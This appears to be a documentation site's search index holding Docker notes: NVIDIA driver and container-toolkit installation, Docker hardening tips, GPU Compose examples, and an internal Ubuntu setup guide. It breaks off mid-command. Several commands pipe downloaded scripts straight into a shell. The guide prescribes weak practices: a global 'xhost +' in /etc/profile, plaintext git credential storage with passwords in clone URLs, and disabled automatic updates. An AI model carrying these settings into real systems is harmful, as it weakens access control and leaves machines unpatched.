/sys/devices/pci0000:00/0000:00:03.1/0000:09:00.0 ==\nmodalias : pci:v000010DEd00002204sv00001462sd00003881bc03sc00i00\nvendor   : NVIDIA Corporation\ndriver   : nvidia-driver-515 - third-party non-free recommended\ndriver   : nvidia-driver-470-server - distro non-free\ndriver   : nvidia-driver-510 - distro non-free\ndriver   : nvidia-driver-510-server - distro non-free\ndriver   : nvidia-driver-470 - distro non-free\ndriver   : xserver-xorg-video-nouveau - distro free builtin\n#####\n# pick up the latest one with format nvidia-driver-###\nsudo apt install nvidia-driver-515 -y\n</code></pre> <p>If not, try it and reinatll NVIDIA drivers</p> <pre><code>sudo apt-get remove --purge '^nvidia-.*'\n</code></pre>"},{"location":"Dockers/ALG-Nvidia/#32-install-nvidia-docker2","title":"3.2 Install NVidia-docker2","text":"<pre><code>distribution=$(. /etc/os-release;echo $ID$VERSION_ID) \\\n      &amp;&amp; curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg \\\n      &amp;&amp; curl -s -L https://nvidia.github.io/libnvidia-container/$distribution/libnvidia-container.list | \\\n            sed 's#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g' | \\\n            sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.list\nsudo apt update &amp;&amp; sudo apt upgrade -y\nsudo apt-get install -y nvidia-docker2\nsudo systemctl restart docker\n\n# validate that nvidia docker is running\nsudo docker run --gpus all nvidia/cuda:11.0-base nvidia-smi\n\n# Note: this last can change according your os version.\n# For UBUNTU 20 or 22, it is:\nsudo docker run --rm --gpus all nvidia/cuda:11.0.3-base-ubuntu20.04 nvidia-smi\n</code></pre>"},{"location":"Dockers/Advanced%20Security%20Features%20of%20Docker%20and%20Kubernetes/","title":"Advanced Security Features of Docker and Kubernetes","text":""},{"location":"Dockers/Advanced%20Security%20Features%20of%20Docker%20and%20Kubernetes/#securing-docker","title":"Securing Docker","text":""},{"location":"Dockers/Advanced%20Security%20Features%20of%20Docker%20and%20Kubernetes/#docker-rootles-limited","title":"Docker Rootles (Limited)","text":""},{"location":"Dockers/Advanced%20Security%20Features%20of%20Docker%20and%20Kubernetes/#httpsdocsdockercomenginesecurityrootless","title":"https://docs.docker.com/engine/security/rootless/","text":""},{"location":"Dockers/Advanced%20Security%20Features%20of%20Docker%20and%20Kubernetes/#docker-socket","title":"Docker socket","text":"<p>No es recomendable compartir el socket de docker con otro docker (Jenkins) evitarla o aplicar defensa en profuncidad.</p> <p>TCP socket: Por defecto esta sin ecriptar, sin cifrar y sin autenticar. (Shodan --&gt; Products Docker 2375:2375)  </p> <ul> <li>Alternativa (build in https ecrypted docker) - create CA server key OpenSSL</li> <li>Run docker daemon TSL</li> <li><code>dockerd --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=serrver-key.pem -H=0.0.0.0:2376</code></li> <li>Remote API certificated</li> <li><code>docker --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=serrver-key.pem -H=&lt;host&gt;:2376 version</code></li> <li><code>export DOCKER_HOST=tecp://&lt;hsot&gt;:2376 DOCKER_TSL_VERIFY=1</code></li> </ul>"},{"location":"Dockers/Advanced%20Security%20Features%20of%20Docker%20and%20Kubernetes/#securing-docker-containers","title":"Securing docker containers","text":"<ul> <li>kernel capabilities (don't run --privileged)  show capabilities(ps -fC) </li> <li><code>docker run --cap-drop=all --cap-add=cap_net_bind_service -p 80:80 nginx</code></li> <li>Seccomp (default)</li> <li><code>docker run --security-opt seccomp=/pth/to/seccomp/profile.json &lt;myapp&gt;</code></li> <li> <p>seccomp-gen (gitlhub)</p> </li> <li> <p>apparmor</p> </li> <li> <p>genuinetools/bane (github)</p> </li> <li><code>sudo apparmor parser -r -W /path/to/your/apparmor-nginx-profile</code></li> <li> <p><code>docker run -d -security-opt \"apparmor-apparmor-profile-name\"-p 80:80 nginx</code></p> </li> <li> <p>root (by default)</p> </li> <li> <p><code>docker run -it --user 2000 alpine sh</code> (user rootless)</p> </li> <li> <p>user remap (docker run with root privileges but host process are runing without privileges)</p> <ul> <li> <p>/etc/docker/daemon.json</p> </li> <li> <p>{</p> </li> </ul> <p>\"userns-remap\":\"default\"</p> <p>}</p> </li> <li> <p>docker container trust (signed images)</p> </li> <li> <p>Step 1: $ DOCKER_CONTENT_TRUST=1     Step 2: $ docker trust key generate syourname&gt;     Step 3: $ docker trust signer add -key syour-key.pub&gt;  your-repo&gt;"},{"location":"Dockers/Advanced%20Security%20Features%20of%20Docker%20and%20Kubernetes/#securing-kubernetes-enviroments","title":"Securing Kubernetes Enviroments","text":""},{"location":"Dockers/BuildArgs/","title":"Docker build with --build-arg with multiple arguments from file","text":"<p>Posted Nov 3, 2018</p> <p>By Andr\u00e9 Ilhicas dos Santos</p> <p>1 min read</p>"},{"location":"Dockers/BuildArgs/#introduction","title":"Introduction","text":"<p>On my last post I described how to use a single <code>ARG</code> with a list of packages to be installed on an alpine image.</p> <p>But what happens when your Dockefile contains a multitude of <code>BUILD ARGS</code> that you wish to pass along the build from a single file that contains them.</p> <p>Let\u2019s check an rather simple Dockerfile what I\u2019m trying to explain here.</p> <pre><code>1 2 3 4 5 6 7 8 9 10 11 12 13 FROM python:latest ARG ARG_1=first_argument ARG ARG_2=second_argument ARG ARG_3=third_argument ARG ARG_4=fourth_argument ARG ARG_12=first_second_argument ARG ARG_22=second_second_argument ARG ARG_32=third_second_argument ARG ARG_42=fourth_second_argument ARG ARG_13=first_third_argument ARG ARG_23=second_third_argument ARG ARG_33=third_third_argument ARG ARG_43=fourth_third_argument \n</code></pre> <p>If you wan\u2019t to override all this arguments using the <code>--build-arg</code> would require you to have the following command (or similar)</p> <pre><code>docker build -t custom:stuff --build-arg ARG_1=1st --build-arg ARG_2=2nd --build-arg ARG_3=3rd ... #you get the point \n</code></pre> <p>Now imagine you would want to have those build args defined in a file similar to a <code>.env</code> or <code>env_file</code> that you wish to use in order to have different multiple builds, for staging production etc.. , as that would be much more pratical.</p>"},{"location":"Dockers/BuildArgs/#build-arg-with-multiple-arguments-from-file-with-bash","title":"\u2013build-arg with multiple arguments from file with bash","text":"<p>This could obvisouly be achieved on many other terminal interpreters, for simplicity and since my main OS is usually Linux with bash as interpreter, I\u2019ve done it in bash</p> <p>Now let\u2019s create a file named <code>build.args</code> with the following contents</p> <pre><code>ARG_1=1st ARG_2=2nd ARG_3=3rd ARG_4=4th ARG_12=1st2nd ARG_22=2nd2nd ARG_32=3rd2nd ARG_42=4th2nd ARG_13=1st3rd ARG_23=2nd3rd ARG_33=3rd3rd ARG_43=4th3rd \n</code></pre> <p>Now, how to use this <code>build.args</code> to build an image and its respective build args from this file.</p> <pre><code>1 docker build -t custom:stuff $(for i in `cat build.args`; do out+=\"--build-arg $i \" ; done; echo $out;out=\"\") . \n</code></pre> <pre><code>out=\"\"; for i in $(cat ./build.args); do out=\"$out--build-arg $i \"; done; echo \"$out\"; out=\"\"\n</code></pre> <p>It might not be the simplest single line command to read, but when using on CI/CD pipeline for instance, you could have multiple build environments from multiple files, while also avoiding a train of <code>--build-arg</code> in the shell.</p>"},{"location":"Dockers/Dockers%20Best%20Practices/","title":"Dockers Best Practices","text":""},{"location":"Dockers/Dockers%20Best%20Practices/#securing-docker-daemon-and-core-components","title":"SECURING DOCKER DAEMON AND CORE COMPONENTS","text":""},{"location":"Dockers/Dockers%20Best%20Practices/#daemon-rootless-mode","title":"DAEMON ROOTLESS MODE","text":"<ol> <li>Get and run the installation script:</li> </ol> <p><code>curl -fsSL https://get.docker.com/rootless | sh</code></p> <ol> <li>Add the following environment variables to ~/.bashrc:</li> </ol> <p><code>export XDG_RUNTIME_DIR=/tmp/docker-1000</code> </p> <p><code>export PATH=/home/non-root/bin:$PATH export</code></p> <p><code>DOCKER_HOST=unix:///tmp/docker-1000/docker.sock</code></p> <ol> <li>Run the Docker daemon in rootless mode</li> </ol> <p>\u200b   <code>/home/non-root/bin/dockerd-rootless.sh --experimental --storage-driver vfs &amp;</code> </p> <ol> <li>Check if Docker is actually running in rootless mode, for that, run \u201edocker info\u201c command and  check the \u201eSecurity Options\u201c:</li> </ol> <p><code>docker info</code></p> <p>\u200b   </p>"},{"location":"Dockers/Dockers%20Best%20Practices/#securing-docker-socket","title":"SECURING DOCKER SOCKET","text":""},{"location":"Dockers/Dockers%20Best%20Practices/#securing-api-endpoint","title":"SECURING API ENDPOINT","text":""},{"location":"Dockers/Dockers%20Best%20Practices/#securing-docker-containers","title":"SECURING DOCKER CONTAINERS","text":""},{"location":"Dockers/GPUDocker/","title":"Turn on GPU access with Docker Compose","text":"<p>Compose services can define GPU device reservations if the Docker host contains such devices and the Docker Daemon is set accordingly. For this, make sure you install the prerequisites if you haven't already done so.</p> <p>The examples in the following sections focus specifically on providing service containers access to GPU devices with Docker Compose. You can use either <code>docker-compose</code> or <code>docker compose</code> commands. For more information, see Migrate to Compose V2.</p>"},{"location":"Dockers/GPUDocker/#enabling-gpu-access-to-service-containers","title":"Enabling GPU access to service containers","text":"<p>GPUs are referenced in a <code>compose.yml</code> file using the device attribute from the Compose Deploy specification, within your services that need them.</p> <p>This provides more granular control over a GPU reservation as custom values can be set for the following device properties:</p> <ul> <li><code>capabilities</code>. This value specifies as a list of strings (eg. <code>capabilities: [gpu]</code>). You must set this field in the Compose file. Otherwise, it returns an error on service deployment.</li> <li><code>count</code>. This value, specified as an integer or the value <code>all</code>, represents the number of GPU devices that should be reserved (providing the host holds that number of GPUs). If <code>count</code> is set to <code>all</code> or not specified, all GPUs available on the host are used by default.</li> <li><code>device_ids</code>. This value, specified as a list of strings, represents GPU device IDs from the host. You can find the device ID in the output of <code>nvidia-smi</code> on the host. If no <code>device_ids</code> are set, all GPUs available on the host are used by default.</li> <li><code>driver</code>. This value is specified as a string, for example <code>driver: 'nvidia'</code></li> <li><code>options</code>. Key-value pairs representing driver specific options.</li> </ul> <p>Important</p> <p>You must set the <code>capabilities</code> field. Otherwise, it returns an error on service deployment.</p> <p><code>count</code> and <code>device_ids</code> are mutually exclusive. You must only define one field at a time.</p> <p>For more information on these properties, see the <code>deploy</code> section in the Compose Specification.</p>"},{"location":"Dockers/GPUDocker/#example-of-a-compose-file-for-running-a-service-with-access-to-1-gpu-device","title":"Example of a Compose file for running a service with access to 1 GPU device:","text":"<pre><code>services:\n  test:\n    image: nvidia/cuda:12.3.1-base-ubuntu20.04\n    command: nvidia-smi\n    deploy:\n      resources:\n        reservations:\n          devices:\n            - driver: nvidia\n              count: 1\n              capabilities: [gpu]\n</code></pre> <p>Run with Docker Compose:</p> <pre><code>$ docker compose up\nCreating network \"gpu_default\" with the default driver\nCreating gpu_test_1 ... done\nAttaching to gpu_test_1    \ntest_1  | +-----------------------------------------------------------------------------+\ntest_1  | | NVIDIA-SMI 450.80.02    Driver Version: 450.80.02    CUDA Version: 11.1     |\ntest_1  | |-------------------------------+----------------------+----------------------+\ntest_1  | | GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |\ntest_1  | | Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |\ntest_1  | |                               |                      |               MIG M. |\ntest_1  | |===============================+======================+======================|\ntest_1  | |   0  Tesla T4            On   | 00000000:00:1E.0 Off |                    0 |\ntest_1  | | N/A   23C    P8     9W /  70W |      0MiB / 15109MiB |      0%      Default |\ntest_1  | |                               |                      |                  N/A |\ntest_1  | +-------------------------------+----------------------+----------------------+\ntest_1  |                                                                                \ntest_1  | +-----------------------------------------------------------------------------+\ntest_1  | | Processes:                                                                  |\ntest_1  | |  GPU   GI   CI        PID   Type   Process name                  GPU Memory |\ntest_1  | |        ID   ID                                                   Usage      |\ntest_1  | |=============================================================================|\ntest_1  | |  No running processes found                                                 |\ntest_1  | +-----------------------------------------------------------------------------+\ngpu_test_1 exited with code 0\n</code></pre> <p>On machines hosting multiple GPUs, the <code>device_ids</code> field can be set to target specific GPU devices and <code>count</code> can be used to limit the number of GPU devices assigned to a service container.</p> <p>You can use <code>count</code> or <code>device_ids</code> in each of your service definitions. An error is returned if you try to combine both, specify an invalid device ID, or use a value of count that\u2019s higher than the number of GPUs in your system.</p> <pre><code>$ nvidia-smi   \n+-----------------------------------------------------------------------------+\n| NVIDIA-SMI 450.80.02    Driver Version: 450.80.02    CUDA Version: 11.0     |\n|-------------------------------+----------------------+----------------------+\n| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |\n| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |\n|                               |                      |               MIG M. |\n|===============================+======================+======================|\n|   0  Tesla T4            On   | 00000000:00:1B.0 Off |                    0 |\n| N/A   72C    P8    12W /  70W |      0MiB / 15109MiB |      0%      Default |\n|                               |                      |                  N/A |\n+-------------------------------+----------------------+----------------------+\n|   1  Tesla T4            On   | 00000000:00:1C.0 Off |                    0 |\n| N/A   67C    P8    11W /  70W |      0MiB / 15109MiB |      0%      Default |\n|                               |                      |                  N/A |\n+-------------------------------+----------------------+----------------------+\n|   2  Tesla T4            On   | 00000000:00:1D.0 Off |                    0 |\n| N/A   74C    P8    12W /  70W |      0MiB / 15109MiB |      0%      Default |\n|                               |                      |                  N/A |\n+-------------------------------+----------------------+----------------------+\n|   3  Tesla T4            On   | 00000000:00:1E.0 Off |                    0 |\n| N/A   62C    P8    11W /  70W |      0MiB / 15109MiB |      0%      Default |\n|                               |                      |                  N/A |\n+-------------------------------+----------------------+----------------------+\n</code></pre>"},{"location":"Dockers/GPUDocker/#access-specific-devices","title":"Access specific devices","text":"<p>To allow access only to GPU-0 and GPU-3 devices:</p> <pre><code>services:\n  test:\n    image: tensorflow/tensorflow:latest-gpu\n    command: python -c \"import tensorflow as tf;tf.test.gpu_device_name()\"\n    deploy:\n      resources:\n        reservations:\n          devices:\n          - driver: nvidia\n            device_ids: ['0', '3']\n            capabilities: [gpu]\n</code></pre> <pre><code>sudo apt-get install -y nvidia-docker2\n</code></pre>"},{"location":"Dockers/algDocs/","title":"Vanilla Ubuntu setup","text":""},{"location":"Dockers/algDocs/#-","title":"-","text":"<p>Owned by Jason AGYEKUM</p> <p>Last updated: about 5 hours ago by Rafael MADOLELL</p> <p>14 min read4 people viewed</p> <ul> <li>Xorg setup </li> <li>0 Install Rust Desktop</li> <li>1 Install Nvidia Drivers</li> <li>2 Install basic packages</li> <li>3 Install Docker &amp; docker-compose</li> <li>3.1 Setup permissions for docker-compose</li> <li>3.2 Install NVidia-docker2</li> <li>4 Install Vimba, Teamviewer, FFMPEG, Git, wmctrl and Ansible </li> <li>5 Enable xhost +</li> <li>6 Repositories setup</li> <li>7 Disable Automatic Updates via Command Line</li> <li>8 Putting everything together and running it</li> <li>9 Install Gstreamer + Plugins</li> </ul> <p></p> <p>NOTE: latest Ubuntu versions have Wayland set as a default display server. However, this doesn\u2019t work well with TeamViewer. We strongly suggest using Ubuntu with Xorg. </p> <p>For any problem during or after the setup please refer to: Troubleshooting articles </p>"},{"location":"Dockers/algDocs/#xorg-setup","title":"Xorg setup","text":"<pre><code>sudo nano /etc/gdm3/custom.conf\n</code></pre> <p>and then make sure that WaylandEnabled is set to false</p> <pre><code>WaylandEnable=false\n</code></pre> <p>Save and then logout and login again from the Ubuntu session.</p>"},{"location":"Dockers/algDocs/#0-install-rust-desktop","title":"0 Install Rust Desktop","text":"<pre><code>## Anydesk install sudo apt update &amp;&amp; sudo apt upgrade -y sudo apt-get install -y \\    apt-transport-https \\    ca-certificates \\    curl \\    gnupg-agent \\    software-properties-common wget https://github.com/rustdesk/rustdesk/releases/download/1.2.3/rustdesk-1.2.3-x86_64.deb -O ./rustdesk-1.2.3-x86_64.deb sudo apt install -y ./rustdesk-1.2.3-x86_64.deb\n</code></pre>"},{"location":"Dockers/algDocs/#1-install-nvidia-drivers","title":"1 Install Nvidia Drivers","text":"<pre><code>sudo apt update &amp;&amp; sudo apt upgrade -y sudo apt install -y build-essential libglvnd-dev pkg-config # Note: These gcc versions will change according your kernel version. # For utuntu 22.04, it's gcc-11 g++-11 and not the suggested 7. sudo apt -y install gcc-7 g++-7 gcc-8 g++-8 gcc-9 g++-9 sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-7 7 sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-7 7 sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-8 8 sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-8 8 sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 9 sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-9 9 # nvidia driver needs gcc 7, run the command and choose gcc version 7 sudo update-alternatives --config gcc # nvidia driver needs g++ 7, run the command and choose g++ version 7 sudo update-alternatives --config g++ # verify gcc version gcc --version # Sample output gcc (Ubuntu 7.5.0-6ubuntu2) 7.5.0 Copyright (C) 2017 Free Software Foundation, Inc. This is free software; see the source for copying conditions.  There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. # verify g++ version g++ --version # Sample output g++ (Ubuntu 7.5.0-6ubuntu2) 7.5.0 Copyright (C) 2017 Free Software Foundation, Inc. This is free software; see the source for copying conditions.  There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. # if add-apt repository takes too long, run this comand before hand sudo sysctl net.ipv6.conf.all.disable_ipv6=1 sudo add-apt-repository ppa:graphics-drivers/ppa -y sudo apt update &amp;&amp; sudo apt upgrade -y ubuntu-drivers devices ##### == /sys/devices/pci0000:00/0000:00:03.1/0000:09:00.0 == modalias : pci:v000010DEd00002204sv00001462sd00003881bc03sc00i00 vendor   : NVIDIA Corporation driver   : nvidia-driver-515 - third-party non-free recommended driver   : nvidia-driver-470-server - distro non-free driver   : nvidia-driver-510 - distro non-free driver   : nvidia-driver-510-server - distro non-free driver   : nvidia-driver-470 - distro non-free driver   : xserver-xorg-video-nouveau - distro free builtin ##### # pick up the latest one with format nvidia-driver-### sudo apt install nvidia-driver-515 -y\n</code></pre> <p>If the machine has secure boot see the following instructions</p> <p>``</p> <pre><code>sudo reboot nvidia-smi\n</code></pre> <p>Check for CUDA Version and Driver Version above or equal to the ones shown here. It should also list some processes.</p> <p>Sample output of <code>nvidia-smi</code></p> <pre><code>##################################### # Sample output Fri May 13 12:56:11 2022        +-----------------------------------------------------------------------------+ | NVIDIA-SMI 510.68.02    Driver Version: 510.68.02    CUDA Version: 11.6     | |-------------------------------+----------------------+----------------------+ | GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC | | Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. | |                               |                      |               MIG M. | |===============================+======================+======================| |   0  NVIDIA GeForce ...  Off  | 00000000:01:00.0 Off |                  N/A | | N/A   48C    P8     9W /  N/A |      5MiB /  8192MiB |      0%      Default | |                               |                      |                  N/A | +-------------------------------+----------------------+----------------------+                                                                                +-----------------------------------------------------------------------------+ | Processes:                                                                  | |  GPU   GI   CI        PID   Type   Process name                  GPU Memory | |        ID   ID                                                   Usage      | |=============================================================================| |    0   N/A  N/A       943      G   /usr/lib/xorg/Xorg                  4MiB | +-----------------------------------------------------------------------------+ #####################################\n</code></pre> <p>NVIDIA Driver should be successfully installed.</p> <p>If not, try it and reinatll NVIDIA drivers</p> <pre><code>sudo apt-get remove --purge '^nvidia-.*'\n</code></pre>"},{"location":"Dockers/algDocs/#2-install-basic-packages","title":"2 Install basic packages","text":"<pre><code>sudo apt update &amp;&amp; sudo apt upgrade -y curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo apt-key fingerprint 0EBFCD88\n</code></pre> <p>Expected output of <code>sudo apt-key fingerprint 0EBFCD88</code></p> <pre><code>##################################### # expected output pub   rsa4096 2017-02-22 [SCEA]    9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88 uid           [ unknown] Docker Release (CE deb) &lt;docker@docker.com&gt; sub   rsa4096 2017-02-22 [S] #####################################\n</code></pre>"},{"location":"Dockers/algDocs/#3-install-docker-docker-compose","title":"3 Install Docker &amp; docker-compose","text":"<pre><code># multiline command sudo add-apt-repository \\ \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable\" # end of multiline command sudo apt update &amp;&amp; sudo apt upgrade -y sudo apt-get install -y docker-ce docker-ce-cli containerd.io # verify docker is running sudo docker run hello-world\n</code></pre> <p>Expected output of <code>sudo docker run hello-world</code></p> <pre><code>##################################### # expected output Unable to find image 'hello-world:latest' locally latest: Pulling from library/hello-world 2db29710123e: Pull complete  Digest: sha256:80f31da1ac7b312ba29d65080fddf797dd76acfb870e677f390d5acba9741b17 Status: Downloaded newer image for hello-world:latest Hello from Docker! This message shows that your installation appears to be working correctly. #####################################\n</code></pre>"},{"location":"Dockers/algDocs/#31-setup-permissions-for-docker-compose","title":"3.1 Setup permissions for docker-compose","text":"<pre><code>sudo usermod -a -G docker $USER sudo reboot sudo curl -L \"https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose sudo rm /usr/bin/docker-compose sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose sudo systemctl restart docker\n</code></pre>"},{"location":"Dockers/algDocs/#32-install-nvidia-docker2","title":"3.2 Install NVidia-docker2","text":"<pre><code>distribution=$(. /etc/os-release;echo $ID$VERSION_ID) \\      &amp;&amp; curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg \\      &amp;&amp; curl -s -L https://nvidia.github.io/libnvidia-container/$distribution/libnvidia-container.list | \\            sed 's#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g' | \\            sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.list sudo apt update &amp;&amp; sudo apt upgrade -y sudo apt-get install -y nvidia-docker2 sudo systemctl restart docker # validate that nvidia docker is running sudo docker run --gpus all nvidia/cuda:11.0-base nvidia-smi # Note: this last can change according your os version. # For UBUNTU 20 or 22, it is: sudo docker run --rm --gpus all nvidia/cuda:11.0.3-base-ubuntu20.04 nvidia-smi\n</code></pre> <p>Expected output of <code>sudo docker run --gpus all nvidia/cuda:11.0-base nvidia-smi</code></p> <pre><code>##################################### # expected output Unable to find image 'nvidia/cuda:11.0-base' locally 11.0-base: Pulling from nvidia/cuda 54ee1f796a1e: Pull complete  f7bfea53ad12: Pull complete  46d371e02073: Pull complete  b66c17bbf772: Pull complete  3642f1a6dfb3: Pull complete  e5ce55b8b4b9: Pull complete  155bc0332b0a: Pull complete  Digest: sha256:774ca3d612de15213102c2dbbba55df44dc5cf9870ca2be6c6e9c627fa63d67a Status: Downloaded newer image for nvidia/cuda:11.0-base Fri May 13 17:37:15 2022        +-----------------------------------------------------------------------------+ | NVIDIA-SMI 510.68.02    Driver Version: 510.68.02    CUDA Version: 11.6     | |-------------------------------+----------------------+----------------------+ | GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC | | Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. | |                               |                      |               MIG M. | |===============================+======================+======================| |   0  NVIDIA GeForce ...  Off  | 00000000:01:00.0  On |                  N/A | | N/A   46C    P8    14W /  N/A |     54MiB /  8192MiB |     16%      Default | |                               |                      |                  N/A | +-------------------------------+----------------------+----------------------+                                                                                +-----------------------------------------------------------------------------+ | Processes:                                                                  | |  GPU   GI   CI        PID   Type   Process name                  GPU Memory | |        ID   ID                                                   Usage      | |=============================================================================| +-----------------------------------------------------------------------------+ #####################################\n</code></pre> <p>Validate NVidia-docker2 works in docker-compose</p> <pre><code># Validate that nvidia runtime works in docker-compose # For Ubuntu 18 echo \"services:  test:    image: nvidia/cuda:11.0.3-base-ubuntu20.04    command: nvidia-smi    runtime: nvidia\" &gt; docker-compose.yml     # For Ubuntu 20 or higher echo \"services:  test:    image: nvidia/cuda:11.0.3-base-ubuntu20.04    command: nvidia-smi    runtime: nvidia\" &gt; docker-compose.yml docker-compose up\n</code></pre> <p>Expected output of <code>docker-compose up</code></p> <pre><code>##################################### # expected output Creating nicoloco_test_1 ... done Attaching to nicoloco_test_1 test_1  | Fri May 13 19:02:01 2022        test_1  | +-----------------------------------------------------------------------------+ test_1  | | NVIDIA-SMI 510.68.02    Driver Version: 510.68.02    CUDA Version: 11.6     | test_1  | |-------------------------------+----------------------+----------------------+ test_1  | | GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC | test_1  | | Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. | test_1  | |                               |                      |               MIG M. | test_1  | |===============================+======================+======================| test_1  | |   0  NVIDIA GeForce ...  Off  | 00000000:01:00.0 Off |                  N/A | test_1  | | N/A   46C    P0    28W /  N/A |      5MiB /  8192MiB |      0%      Default | test_1  | |                               |                      |                  N/A | test_1  | +-------------------------------+----------------------+----------------------+ test_1  |                                                                                 test_1  | +-----------------------------------------------------------------------------+ test_1  | | Processes:                                                                  | test_1  | |  GPU   GI   CI        PID   Type   Process name                  GPU Memory | test_1  | |        ID   ID                                                   Usage      | test_1  | |=============================================================================| test_1  | +-----------------------------------------------------------------------------+ #####################################\n</code></pre>"},{"location":"Dockers/algDocs/#4-install-vimba-teamviewer-ffmpeg-git-wmctrl-and-ansible","title":"4 Install Vimba, Teamviewer, FFMPEG, Git, wmctrl and Ansible","text":"<pre><code># Download vimba software from https://www.alliedvision.com/en/products/vimba-sdk/#c1497 curl -L https://downloads.alliedvision.com/Vimba64_v6.0_Linux.tgz &gt; Vimba64_v6.0_Linux.tgz tar -xzf Vimba64_v6.0_Linux.tgz -C ~/ sudo Vimba_6_0/VimbaUSBTL/Install.sh sudo reboot # TEAMVIEWER cd /tmp wget https://download.teamviewer.com/download/linux/signature/TeamViewer2017.asc sudo apt-key add TeamViewer2017.asc sudo sh -c 'echo \"deb http://linux.teamviewer.com/deb stable main\" &gt;&gt; /etc/apt/sources.list.d/teamviewer.list' sudo sh -c 'echo \"deb http://linux.teamviewer.com/deb preview main\" &gt;&gt; /etc/apt/sources.list.d/teamviewer.list' sudo apt update sudo apt install -y teamviewer ##################################################################################### # DEPRECATED                             # Install FFMPEG sudo apt install -y ffmpeg sudo apt update &amp;&amp; sudo apt upgrade -y ##################################################################################### # Install net-tools sudo apt install -y net-tools # Install Git sudo apt install -y git # Install wmctrl sudo apt install -y wmctrl # Install Ansible sudo apt install -y ansible # Install jq sudo apt install -y jq # Install Python3 sudo add-apt-repository ppa:deadsnakes/ppa sudo apt-get update sudo apt-get install python3.8 \n</code></pre>"},{"location":"Dockers/algDocs/#5-enable-xhost","title":"5 Enable xhost +","text":"<pre><code># Execute only once sudo echo \"xhost +\" &gt;&gt; /etc/profile # if it happens to give permission denied do the following: sudo gedit /etc/profile # add one new line at the end of the file: xhost + sudo reboot\n</code></pre>"},{"location":"Dockers/algDocs/#6-repositories-setup","title":"6 Repositories setup","text":"<pre><code># We need to add credentials in first instalation. ## Set vault sudo git config --global credential.helper store ## Set vault in root folder sudo git config --global credential.helper \"store --file /root/.git-credentials\" # Repositories setup mkdir ~/alg-repositories cd ~/alg-repositories # input username and password for github # Complete command with credentials in https://brooklynlab.atlassian.net/wiki/spaces/A/pages/16973825/Mega+computer+credentials#BTS-repository-user sudo git clone https://username:password@git.jolibrain.com/cartier/cartier_lg_web.git # Delete the last history record  history -d $(history | cut -d \" \" -f 3 | tail -n 2 | head -n 1) # input username and password for github when asked # Complete command with credentials in https://brooklynlab.atlassian.net/wiki/spaces/A/pages/16973825/Mega+computer+credentials#BTS-repository-user sudo git clone https://username:password@github.com/cartier-lab/megacomputer-scripts.git # Delete the last history record  history -d $(history | cut -d \" \" -f 3 | tail -n 2 | head -n 1) # input username and password for github when asked # Complete command with credentials in https://brooklynlab.atlassian.net/wiki/spaces/A/pages/16973825/Mega+computer+credentials#BTS-repository-user sudo git clone https://username:password@github.com/cartier-lab/mc-playbooks.git # Delete the last history record  history -d $(history | cut -d \" \" -f 3 | tail -n 2 | head -n 1)\n</code></pre>"},{"location":"Dockers/algDocs/#7-disable-automatic-updates-via-command-line","title":"7 Disable Automatic Updates via Command Line","text":"<p>Update preferences are stored in the <code>/etc/apt/apt.conf.d/20auto-upgrades</code> file. Open it with nano or your favorite text editor to make some changes to it.</p> <pre><code>sudo nano /etc/apt/apt.conf.d/20auto-upgrades\n</code></pre> <p>To disable automatic updates completely, make sure all these directives are set to \u201c0\u201d. When done, save your changes and exit the file.</p> <pre><code>APT::Periodic::Update-Package-Lists \"0\"; APT::Periodic::Download-Upgradeable-Packages \"0\"; APT::Periodic::AutocleanInterval \"0\"; APT::Periodic::Unattended-Upgrade \"0\";\n</code></pre>"},{"location":"Dockers/algDocs/#8-putting-everything-together-and-running-it","title":"8 Putting everything together and running it","text":"<pre><code># Login to cartier docker registry # Complete command in 'Mega computer credentials' docker login https://cartierdocker.deepdetect.com # Setup configuration export  DATA_ROOT_PATH=/data/cartier/cartier_realtime_data \\ COMPOSE_UID=$(id -u) \\ COMPOSE_GUID=$(id -g) sudo chown -R $USER ~/alg-repositories cd ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime docker-compose up -d ## If you want generate id's use this script cd ~/alg-repositories/megacomputer-scripts docker pull ghcr.io/car-ww-dataoffice/alg-backend:latest docker run --rm --entrypoint env 